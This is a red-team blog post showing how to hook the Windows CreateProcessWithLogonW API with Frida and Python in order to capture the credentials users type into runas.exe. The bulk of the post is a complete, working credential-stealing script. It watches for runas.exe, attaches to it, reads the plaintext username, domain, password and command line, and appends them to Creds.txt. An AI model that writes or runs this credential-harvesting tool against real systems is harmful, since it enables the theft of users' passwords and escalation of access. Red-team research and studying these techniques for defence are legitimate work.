---
title: Offensive API Hooking
author: Ilan Kalendarov
date: 2021-02-10 14:10:00 +0800
categories: [Red Team]
tags: [persistence, av evasion]

---

## Introduction

Hooking is not a new concept as we know by now, many AV/EDR vendors use this technique to monitor suspicious API calls. In this blog post we'll explorer API hooking but in the offensive point of view. We'll use API Monitor to investigate which API calls used by each program  then, using Frida and python to build our final hooking script. This post is inspired by the Red Teaming Experiments [blog post.](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/instrumenting-windows-apis-with-frida )



## API Monitor

Api Monitor is a great tool for .. you guest it, monitoring api calls. You can find it [here](http://www.rohitab.com/downloads).

Firing up Api Monitor this will be the main screen:

![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/ApiMonitorHomeScreen.png)

As you can see I've chosen all of the library's options for seeing all of the API possibilities. Let's start by monitoring a new process, I'll choose runas.exe first.

According to Microsoft docs:

> It allows a user to run specific tools and programs with different permissions than the user's current logon provides.

Looks good to me as a start. So opening runas and trying to login as a different user gives us the above API call:

![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/RunasAPICall.png)

Great so we know that `CreateProcessWithLogonW` api call contains our secret password. Looking at the [microsoft docs](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw)

 we could see that the first and third arguments will store the username and password. Now that we have that information lets build our script !.

# Frida

According to Frida's site:

> It’s [Greasemonkey](https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/) for native apps, or, put in more technical terms, it’s a dynamic code instrumentation toolkit. It lets you inject snippets of JavaScript or your own library into native apps on Windows, macOS, GNU/Linux, iOS, Android, and QNX. Frida also provides you with some simple tools built on top of the Frida API. These can be used as-is, tweaked to your needs, or serve as examples of how to use the API.

We'll be able to build a JavaScript snippet that takes the function name from the DLL library - `Advapi.dll`. The script should look like that:

```javascript
var CreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW') // exporting the function from the dll library

Interceptor.attach(CreateProcessWithLogonW, { // getting our juice arguments (according to microsoft docs)
	onEnter: function (args) {
		this.lpUsername = args[0];
		this.lpDomain = args[1];
		this.lpPassword = args[2];
		this.lpCommandLine = args[5];
	},
	onLeave: function (args) { // getting the plain text credentials 
		send("\\n=============================" + "\\n[+] Retrieving Creds from RunAs.." +"\\n Username    : " + this.lpUsername.readUtf16String() + "\\nCommandline : " + this.lpCommandLine.readUtf16String() + "\\nDomain      : " + this.lpDomain.readUtf16String() + "\\nPassword    : " + this.lpPassword.readUtf16String()+ "\\n=============================");

	}
});
```

Now, all left to do is to insert the JavaScript snippet to a python script, The final python script should look like that:

```python
# Wrriten by Ilan Kalendarov

from __future__ import print_function
import frida
from time import sleep
import psutil
from threading import Lock, Thread

# Locking the runas thread to prevent other threads
#interfering with our current session
lockRunas = Lock()  

def on_message_runas(message, data):
	# Executes when the user enters the password.
	# Then, open the txt file and append the data.
	print(message)
	if message['type'] == "send":
		with open("Creds.txt", "a") as f:
			f.write(message["payload"] + '\n')
		try:
			lockRunas.release()
			print("[+] released")
		except Exception:
			pass


def WaitForRunAs():
	while True:
		# Trying to find if runas is running if so, execute the "RunAs" function.
		if ("runas.exe" in (p.name() for p in psutil.process_iter())) and not lockRunas.locked():
			lockRunas.acquire() # Locking the runas thread
			print("[+] Found RunAs")
			RunAs()
			sleep(0.5)

		# If the user regret and they "ctrl+c" from runas then release the thread lock and start over.
		elif (not "runas.exe" in (p.name() for p in psutil.process_iter())) and lockRunas.locked():
			lockRunas.release()
			print("[+] Runas is dead releasing lock")
		else:
			pass
		sleep(0.5)

def RunAs():
	try:
		# Attaching to the runas process
		print("[+] Trying To Attach To Runas")
		session = frida.attach("runas.exe")
		print("[+] Attached runas!")

		# Executing the following javascript
		# We Listen to the CreateProcessWithLogonW func from Advapi32.dll to catch the username,password,domain and the executing program 		  in plain text.
		script = session.create_script("""

		var CreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW') // exporting the function from 		the dll library
		Interceptor.attach(CreateProcessWithLogonW, { // getting our juice arguments (according to microsoft docs)
			onEnter: function (args) {
				this.lpUsername = args[0];
				this.lpDomain = args[1];
				this.lpPassword = args[2];
				this.lpCommandLine = args[5];
			},
			onLeave: function (args) { // getting the plain text credentials 
				send("\\n=============================" + "\\n[+] Retrieving Creds from RunAs.." +"\\n Username    : " + this.lpUsername.readUtf16String() + "\\nCommandline : " + this.lpCommandLine.readUtf16String() + "\\nDomain      : " + this.lpDomain.readUtf16String() + "\\nPassword    : " + this.lpPassword.readUtf16String()+ "\\n=============================");

			}
		});

		""")

		# If we got a hit then execute the "on_message_runas" function
		script.on('message', on_message_runas)
		script.load()
	except Exception as e:
		print(str(e))

if __name__ == "__main__":
	thread = Thread(target=WaitForRunAs)
	thread.start()
```

Great ! lets try to run the script:

![](https://raw.githubusercontent.com/IlanKalendarov/IlanKalendarov.github.io/main/Images/RunasScript.png)